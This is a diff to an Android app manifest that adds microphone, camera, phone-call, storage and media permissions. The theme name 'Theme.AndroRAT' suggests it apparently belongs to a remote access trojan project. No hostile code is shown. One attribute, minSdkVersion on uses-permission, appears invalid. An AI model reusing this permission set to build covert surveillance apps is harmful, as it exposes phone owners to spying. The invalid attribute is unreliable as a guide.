@@ -2,12 +2,56 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
+    <!--RECORD AUDIO-->
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+
+    <!-- CALL PHONE-->
+    <uses-feature
+        android:name="android.hardware.telephony"
+        android:required="false" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+
+    <!--CAMERA -->
+    <uses-feature
+        android:name="android.hardware.camera"
+        android:required="false" />
+    <uses-permission android:name="android.permission.CAMERA" />
+
+    <!--    Permission for files varies according to device's sdk version-->
+    <!--    For Android 6.0 (sdk 23) "<=" up to "<" Android 10 (sdk 29)-->
+    <uses-permission-sdk-23
+        android:name="android.permission.WRITE_EXTERNAL_STORAGE"
+        android:maxSdkVersion="28" />
+    <uses-permission-sdk-23
+        android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="28" />
+
+    <!--   Android 10 (sdk 29) "<=" up to "<" Android 13 (sdk 33) -->
+    <!--   you don't need to use the READ_EXTERNAL_STORAGE permission
+    on devices that run Android 10 (API level 29) or higher,
+    as long as your app targets Android 10 or higher-->
+
+    <!--Android 13 feature specific -->
+    <uses-permission
+        android:name="android.permission.READ_MEDIA_IMAGES"
+        android:minSdkVersion="33" />
+    <uses-permission
+        android:name="android.permission.READ_MEDIA_VIDEO"
+        android:minSdkVersion="33" />
+    <uses-permission
+        android:name="android.permission.READ_MEDIA_AUDIO"
+        android:minSdkVersion="33" />
+
+    <!--below code line only works in android 10 (sdk 29), will not work in android 11 (sdk30)-->
+    <!--android:requestLegacyExternalStorage="true"-->
+
     <application
         android:allowBackup="true"
         android:dataExtractionRules="@xml/data_extraction_rules"
         android:fullBackupContent="@xml/backup_rules"
         android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
+        android:requestLegacyExternalStorage="true"
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
         android:theme="@style/Theme.AndroRAT"
